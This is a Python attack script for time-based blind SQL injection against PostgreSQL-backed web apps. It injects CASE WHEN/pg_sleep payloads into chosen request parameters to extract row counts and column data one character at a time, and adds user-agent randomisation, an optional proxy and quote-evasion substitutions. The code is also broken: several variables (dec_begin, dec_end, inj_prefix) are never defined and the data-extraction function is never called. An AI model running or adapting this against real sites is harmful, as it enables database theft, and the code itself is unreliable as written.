#!/usr/bin/python3
import requests
import urllib3
import os
import sys
import re
import inquirer
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Timeout
timeout = 10

# Default value for empty parameters
def_str = "1"
def_int = 1234

# ASCII start and end
ascii_begin = 32
ascii_end = 126

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(1)

# HTTP headers
def http_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    headers = {
        'User-Agent': useragent,
    }
    return headers

# Perform the SQLi call for injection
def sqli(url,headers,get_post,inj_param,params,prefix,inj_str,suffix,sleep):
    print("[*] Using injection string: " + prefix + inj_str + suffix)
    # Optionally modify injection string via regex for character evasion
    inj_regex_str = re.sub(" ","+",inj_str)                     # Replace space for +
    inj_regex_str = re.sub("'","$$",inj_regex_str)              # Replace single quote for $$
    print("[*] Character evasion string: " + prefix + inj_regex_str + suffix)
    # Injection parameters
    inj_params = dict()
    for param in params:
        inj_params[param] = def_str
        if param == inj_param:
            inj_params[param] = prefix + inj_str + suffix
    # Disable URL encoding characters
    params_str = "&".join("%s=%s" % (k,v) for k,v in inj_params.items())
    # Do requests
    if get_post.lower() == "get":
        r = requests.get(url,params=inj_params,headers=headers,timeout=timeout,verify=False)
    elif get_post.lower() == "post":
        r = requests.post(url,data=inj_params,headers=headers,timeout=timeout,verify=False)
    # Check response timing
    res = r.elapsed.total_seconds()
    if res >= sleep:
        return True
    elif res < sleep:
        return False

# Extract rows
def get_rows(url,headers,get_post,inj_param,params,prefix,suffix,table,sleep):
    rows = ""
    max_pos_rows = 10
    # Get number maximum positional characters of rows: e.g. 1096,2122,1234,etc.
    for pos in range(1,max_pos_rows+1):
        # Test if current pos does have any valid value. If not, break
        direction = ">"
        inj_rows = "SELECT (CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(COUNT(*) AS VARCHAR(10000))::text,(CHR(" + str(ascii_begin) + "))) FROM " + table + ")::text FROM " + str(pos) + " FOR 1))" + direction + "1) THEN (select " + str(def_int) + " from pg_sleep(" + str(sleep) + ")) else " + str(def_int) + " END)"
        # inj_rows = "SELECT CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(COUNT(*) AS VARCHAR(10000))::text,(CHR(" + str(ascii_begin) + "))) FROM " + table + ")::text FROM " + str(pos) + " FOR 1))" + direction + "1) THEN PG_SLEEP(" + str(sleep) + ") END"
        if not sqli(url,headers,get_post,inj_param,params,prefix,inj_rows,suffix,sleep):
            break
        # Loop decimals
        direction = "="
        for num_rows in range(dec_begin,dec_end+1):
            row_char = chr(num_rows)
            # inj_rows = "=(CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(COUNT(*) AS VARCHAR(10000))::text,(CHR(" + str(ascii_begin) + "))) FROM " + table + ")::text FROM " + str(pos) + " FOR 1))" + direction + str(num_rows) + ") THEN (SELECT " + def_str + " FROM PG_SLEEP(" + str(sleep) + ")) ELSE " + def_str + " END) AND '" + def_str + "'='" + def_str + "'"
            inj_rows = "SELECT CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(COUNT(*) AS VARCHAR(10000))::text,(CHR(" + str(ascii_begin) + "))) FROM " + table + ")::text FROM " + str(pos) + " FOR 1))" + direction + str(num_rows) + ") THEN (SELECT " + def_str + " FROM PG_SLEEP(" + str(sleep) + ")) ELSE " + def_str + " END"
            if sqli(url,headers,get_post,inj_param,params,prefix,inj_rows,suffix,sleep):
                rows += row_char
                print(row_char,end='',flush=True)
                break
    if rows != "":
        print("\n[*] Found " + rows + " rows of data in table '" + table + "'\n")
        return int(rows)
    else:
        return 0

# Loop through positions and characters
def get_data(url,headers,get_post,inj_param,params,prefix,suffix,row,column,table,sleep):
    extracted = ""
    null = "NULL"
    max_pos_len = 50

    # Loop through length of string
    # Not very efficient, should use a guessing algorithm
    print("[*] Extracting strings from row " + str(row+1) + "...")
    for pos in range(0,max_pos_len):
        # Loop through ASCII printable characters
        for guess in range(ascii_begin,ascii_end+1):
            extracted_char = chr(guess)
            direction = "="
            inj_str = inj_prefix + "=(CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(" + column + " AS VARCHAR(10000))::text,(CHR(" + str(ascii_begin) + "))) FROM " + table + " ORDER BY " + column + " OFFSET " + str(row) + " LIMIT 1)::text FROM " + str(pos) + " FOR 1))" + direction + str(guess) + ") THEN (SELECT " + def_str + " FROM PG_SLEEP(" + str(sleep) + ")) ELSE " + def_str + " END) AND '" + def_str + "'='" + def_str + "'"
            if sqli(url,headers,get_post,inj_param,params,prefix,inj_str,suffix,sleep):
                extracted += chr(guess)
                print(extracted_char,end='',flush=True)
                break
    return extracted

# Main
def main(argv):
    if len(sys.argv) == 8:
        get_post = sys.argv[1]
        params = sys.argv[2].split(",")
        sleep = int(sys.argv[3])
        prefix = sys.argv[4]
        table = sys.argv[5]
        suffix = sys.argv[6]
        url = sys.argv[7]
    else:
        print("[*] Usage: " + sys.argv[0] + " <get_post> <params> <sleep> <prefix> <table> <suffix> <url>\n")
        exit(0)
    
    # HTTP headers
    headers = http_headers()

    # Do stuff
    try:
        # Select parameter
        param_question = [inquirer.List('params',
                message="Select a parameter to test for injection:",
                choices=params),]
        param_answer = inquirer.prompt(param_question)
        inj_param = param_answer["params"]

        # Get rows of specified table
        rows = get_rows(url,headers,get_post,inj_param,params,prefix,suffix,table,sleep)
        print(str(rows))
    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
    except requests.exceptions.RequestException as e:
        print("[!] " + e)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
